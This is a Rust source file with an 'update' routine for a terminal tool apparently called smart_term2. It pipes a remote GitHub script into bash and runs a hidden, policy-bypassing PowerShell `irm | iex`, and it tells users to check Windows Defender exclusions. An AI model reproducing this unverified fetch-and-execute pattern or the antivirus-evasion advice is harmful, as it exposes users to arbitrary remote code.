use std::process::Command;

#[cfg(unix)]
pub fn execute() {
    println!("Checking for updates on Unix...");
    let status = Command::new("sh")
        .arg("-c")
        .arg("curl -sSL https://raw.githubusercontent.com/bbhcoder/smart_term2/main/install.sh | bash")
        .status();

    match status {
        Ok(s) if s.success() => println!("Update completed successfully! Please restart your terminal."),
        _ => eprintln!("Failed to run the update script."),
    }
}

#[cfg(windows)]
pub fn execute() {
    println!("Checking for updates on Windows...");
    
    // Check if Windows Defender excluded the folder, give friendly advice if it fails
    let status = Command::new("powershell")
        .args(&[
            "-NoProfile",
            "-ExecutionPolicy",
            "Bypass",
            "-Command",
            "try { Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"irm https://raw.githubusercontent.com/bbhcoder/smart_term2/main/install.ps1?v=5 | iex\"' -ErrorAction Stop } catch { Write-Host 'Update blocked! Please check Windows Defender quarantine or run exclusion command.' -ForegroundColor Red }"
        ])
        .status();

    match status {
        Ok(_) => println!("Update triggered in the background! Please verify Windows Defender is not blocking the binary."),
        Err(e) => eprintln!("Failed to trigger the update script: {}", e),
    }
}